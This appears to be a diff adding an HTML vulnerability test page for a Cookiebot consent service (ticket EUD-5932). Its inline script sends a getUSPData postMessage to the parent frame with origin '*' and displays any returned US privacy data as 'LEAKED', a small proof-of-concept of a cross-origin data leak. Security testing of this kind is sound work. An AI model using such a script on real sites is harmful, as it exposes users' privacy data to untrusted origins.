@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerability Test — cb-consent-service EUD-5932</title>
+  </head>
+  <body>
+  
+    <h1>Ifram Test - cb-consent-service</h1>
+
+    <div class="panel">
+    <h2>Test Results</h2>
+  
+     <script
+    id="Cookiebot"
+    src="https://dev-consent-cookiebot-com.cookiebot.dev/uc.js"
+    data-cbid="88c50b37-685e-4c5f-a166-ce1de4d70060"
+    nonce="cb-test-nonce-abc123"
+    async
+    ></script>
+
+    <!-- Simulate malicious code to run inside an iframe elsewhere -->
+    <script>
+      var uspResult = document.createElement('div');
+      uspResult.id = 'usp-leak-result';
+      uspResult.style.cssText = 'margin-top:20px;padding:12px;border-radius:6px;font-family:monospace;font-size:13px;background:#f5f5f5;border:1px solid #ddd;';
+      uspResult.textContent = 'Waiting for __uspapiReturn...';
+      document.body.appendChild(uspResult);
+    
+      window.addEventListener('message', function (e) {
+        if (e.data && e.data.__uspapiReturn) {
+          uspResult.style.background = '#fef2f2';
+          uspResult.style.border = '1px solid #fecaca';
+          uspResult.textContent = 'LEAKED from ' + e.origin + ': ' + JSON.stringify(e.data.__uspapiReturn);
+          document.title = 'LEAK DETECTED';
+          console.error('USP API DATA LEAKED', e.origin, e.data.__uspapiReturn);
+        }
+      });
+    
+      window.parent.postMessage({
+        __uspapiCall: { command: 'getUSPData', version: 1, callId: 'attack-1' }
+      }, '*');
+</script>
+  
+  </body>
+  </html>
